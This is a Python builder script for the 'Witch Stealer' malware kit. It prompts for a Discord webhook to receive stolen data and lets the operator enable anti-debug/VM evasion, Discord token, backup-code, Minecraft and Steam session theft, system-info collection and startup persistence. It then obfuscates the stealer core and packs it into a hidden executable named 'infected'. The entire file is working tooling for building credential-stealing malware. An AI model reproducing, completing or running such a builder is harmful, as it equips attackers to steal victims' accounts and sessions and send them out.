import re
import os
import ast
import random
import zlib
import base64
import subprocess
import colorama
import sys
from colorama import Fore
import pyfiglet
import datetime
import requests
import getpass
import msvcrt
from pystyle import Center
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn                                                                                                                                                                                                                                                                                                                                                                                          # Witch❤️
from rich import print as rprint
from datetime import *
from plyer import notification

from utils.module.Obfuscators import Obfuscators # Restored because obfscator was not the problem
from utils.module.logger import log_debug, timestamp, log_warn, log_error

os.system("cls")
obf = Obfuscators(include_imports=True, recursion=5)

version = "v1.32.2"
CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup"]
ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup"]
PATH = "src/stealer_core/src.py"

print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
 __          ___ _       _     
 \ \        / (_) |     | |    
  \ \  /\  / / _| |_ ___| |__  
   \ \/  \/ / | | __/ __| '_ \ 
    \  /\  /  | | || (__| | | |
     \/  \/   |_|\__\___|_| |_|
"""))
print (" ")
username = getpass.getuser()
log_debug(f"Witch Version | {version}")
# print (timestamp() + f"{Fore.GREEN}DEBUG")


def ask_toggle(key):
    print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}?:{Fore.CYAN} ", end="", flush=True)
    while True:
        if msvcrt.kbhit():
            ch = msvcrt.getch().decode("utf-8").lower()
            if ch == "y":
                print(f"{Fore.CYAN}\b\b Yes")
                return True
            elif ch == "n":
                print(f"{Fore.CYAN}\b\b No")
                return False
            else:
                print(f"\n{Fore.RED}Invalid Option. Retry please")
                print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}? {Fore.RESET}Enable {key}:{Fore.CYAN} ", end="", flush=True)


def ask_webhook():
    webhook_pattern = re.compile(r"^https://(canary\.|ptb\.)?(discord\.com|discordapp\.com)/api/webhooks/\d{17,20}/[A-Za-z0-9_-]{60,}")
    while True:
        val = input(f"{Fore.LIGHTMAGENTA_EX}?{Fore.RESET} Enter Your Webhook:{Fore.CYAN} ").strip()
        if webhook_pattern.match(val):
            return val
        else:
            log_debug("Invalid Webhook URL provided.")

def update_config_in_file(filepath, updated_config, webhook_url=None):
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            content = f.read()
    except Exception as e:
        log_debug(f"Error reading file {filepath}: {e}")

    try:
        for key, value in updated_config.items():
            content = re.sub(rf'"{key}":\s*(True|False)', f'"{key}": {value}', content)
        if webhook_url:
            content = re.sub(r'"webhook":\s*"[^"]*"', f'"webhook": \"{webhook_url}\"', content)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
        log_debug(f"Config Save Successfully.")
    except Exception as e:
        log_debug(f"Error updating config in {filepath}: {e}")
        sys.exit(1)


def build():
    url = "https://pypi.org/pypi/pyinstaller/json"
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        latest_version = data["info"]["version"]
        log_debug(f"Installing Latest Build Pyinstaller | {latest_version}")
        subprocess.run(["pip", "install", f"pyinstaller=={latest_version}"], shell=True)
    else:
        log_debug("Failed to fetch PyInstaller version from PyPI, installing default...")
        subprocess.run(["pip", "install", "pyinstaller"], shell=True)

    subprocess.run(["pyinstaller", "--version"], shell=True)
    subprocess.run(["pyinstaller", "--help"], shell=True)
    print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Start Build Process")
    subprocess.run([
        "pyinstaller", "--onefile", "--clean", "--noconsole",
        "--name=infected", "--icon=src/ico.ico", "--upx-dir=src/upx",
        "src/stealer_core/src.py"
    ], shell=True)
    print(f"{Fore.LIGHTBLUE_EX}[Pyinstaller]{Fore.RESET} Build Finished.")
    notification.notify(
    title='Build Completed.',
    message='The build is complete, please check the dist.',
    app_name=f'Witch Stealer Builder v{version}',
    timeout=5  
)


def main():
    config = {}
    webhook = ask_webhook()
    for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
        config[key] = ask_toggle(label)
    update_config_in_file(PATH, config, webhook)
    obf.execute(PATH)
    build()

if __name__ == "__main__":
    main()
